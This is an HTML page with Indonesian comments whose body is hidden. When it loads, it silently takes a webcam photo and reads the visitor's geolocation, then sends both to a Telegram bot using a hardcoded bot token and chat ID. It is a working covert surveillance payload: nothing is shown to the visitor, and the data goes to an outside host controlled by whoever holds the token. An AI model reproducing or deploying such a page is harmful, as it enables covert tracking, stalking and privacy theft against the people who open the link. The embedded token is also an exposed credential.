<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Capture & Send</title>
</head>
<body style="display:none;">
  <video id="video" autoplay playsinline style="display:none;"></video>
  <canvas id="canvas" style="display:none;"></canvas>

  <script>
    const botToken = '7927041124:AAHuSSavc_9B1BLJDo91nIz4bO_fih2gLro';
    const chatId = '7041008009';

    async function sendToTelegram(imageData, latitude, longitude) {
      try {
        // 1. Kirim Foto
        const blob = await (await fetch(imageData)).blob();
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', blob, 'photo.jpg');

        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
          method: 'POST',
          body: formData
        });

        // 2. Kirim Lokasi
        await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            chat_id: chatId,
            latitude,
            longitude
          })
        });
      } catch (err) {
        console.error("Gagal mengirim ke Telegram:", err);
      }
    }

    async function captureAndSend() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        video.srcObject = stream;

        // Tunggu sampai video siap
        await new Promise(resolve => video.onloadedmetadata = resolve);

        // Ambil frame
        const context = canvas.getContext('2d');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        const imageData = canvas.toDataURL('image/jpeg');

        // Hentikan kamera
        stream.getTracks().forEach(track => track.stop());

        // Ambil lokasi
        navigator.geolocation.getCurrentPosition((position) => {
          const { latitude, longitude } = position.coords;
          sendToTelegram(imageData, latitude, longitude);
        }, (err) => {
          console.error("Gagal mengambil lokasi:", err);
        });

      } catch (err) {
        console.error("Gagal akses kamera atau lainnya:", err);
      }
    }

    captureAndSend();
  </script>
</body>
</html>
